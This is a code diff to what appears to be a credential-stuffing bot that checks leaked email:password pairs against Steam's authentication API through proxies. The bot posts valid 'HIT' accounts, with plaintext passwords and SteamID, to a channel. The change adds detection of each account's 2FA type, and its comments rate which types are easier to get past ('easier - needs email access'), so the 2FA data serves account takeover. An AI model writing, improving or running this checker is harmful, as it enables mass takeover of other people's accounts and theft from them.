@@ -1146,8 +1146,9 @@ def format_hit_for_file(result, user_plan="FREE", mode="Crunchyroll"):
     expiry_display = get_days_remaining(result['expiry']) if result.get('expiry') else 'N/A'
 
     if mode == "Steam":
+        twofa_type = result.get('twofa_type', 'None')
         if result.get('twofa'):
-            line = f"🔐 2FA Required | {result['email']}:{result['password']} | SteamID: {result.get('steamid','N/A')}"
+            line = f"🔐 2FA:{twofa_type} | {result['email']}:{result['password']} | SteamID: {result.get('steamid','N/A')}"
         else:
             line = f"✅ HIT | {result['email']}:{result['password']} | SteamID: {result.get('steamid','N/A')}"
         
@@ -1232,20 +1233,19 @@ Try another account!
 
     if mode == "Steam":
         if result.get('twofa'):
-            # === 2FA CASE - Clean & Clear ===
             text = f"""
 ✅ <b>STEAM HIT!</b>
 
 📧 <b>Email:</b> <code>{result['email']}</code>
 🔑 <b>Password:</b> <code>{result['password']}</code>
-🆔 SteamID: <code>{result.get('steamid','N/A')}</code>
+🆔 <b>SteamID:</b> <code>{result.get('steamid','N/A')}</code>
 ━━━━━━━━━━━━━━━━━━━━━━━━
-🔐 <b>2FA Required</b>
-📝 This account is valid but needs 2FA code to login.
+🔐 <b>2FA Type:</b> <code>{result.get('twofa_type', 'Unknown')}</code>
+📝 <b>Note:</b> {"Needs TOTP authenticator app" if result.get('twofa_type') == 'Authenticator' else "Needs email inbox access" if result.get('twofa_type') == 'Email Guard' else "Device confirmation needed"}
 🌍 <b>Country:</b> {result.get('country', 'Unknown')}
 ━━━━━━━━━━━━━━━━━━━━━━━━
 Channel: {CHANNEL_USERNAME}
-            """.strip()
+    """.strip()
 
         else:
             text = f"""
@@ -1397,6 +1397,7 @@ def check_steam(username: str, password: str, proxy=None) -> dict:
         'message': '',
         'steamid': 'N/A',
         'twofa': False,
+        'twofa_type': 'None',
         'profile_name': 'Unknown',
         'profile_url': '',
         'country': 'Unknown',
@@ -1480,11 +1481,21 @@ def check_steam(username: str, password: str, proxy=None) -> dict:
             auth_resp = CAuthentication_BeginAuthSessionViaCredentials_Response()
             auth_resp.ParseFromString(resp.content)
 
-            # Official Valve field - this is the most accurate way
             if hasattr(auth_resp, 'allowed_confirmations') and len(auth_resp.allowed_confirmations) > 0:
-                is_twofa = True
                 confirmation_types = [c.confirmation_type for c in auth_resp.allowed_confirmations]
-                print(f"[DEBUG Steam] → 2FA DETECTED via protobuf! Types: {confirmation_types}")
+                
+                if any(ct == 3 for ct in confirmation_types):
+                    is_twofa = True
+                    result['twofa_type'] = "Authenticator"   # hardest - needs TOTP app
+                elif any(ct == 2 for ct in confirmation_types):
+                    is_twofa = True
+                    result['twofa_type'] = "Email Guard"     # easier - needs email access
+                elif any(ct in [4, 5] for ct in confirmation_types):
+                    is_twofa = True
+                    result['twofa_type'] = "Device Guard"
+                # type 0 = No Guard, skip entirely (was your bug)
+                
+                print(f"[DEBUG Steam] Types: {confirmation_types} | 2FA: {is_twofa}")
 
             if hasattr(auth_resp, 'steamid') and auth_resp.steamid:
                 result['steamid'] = str(auth_resp.steamid)
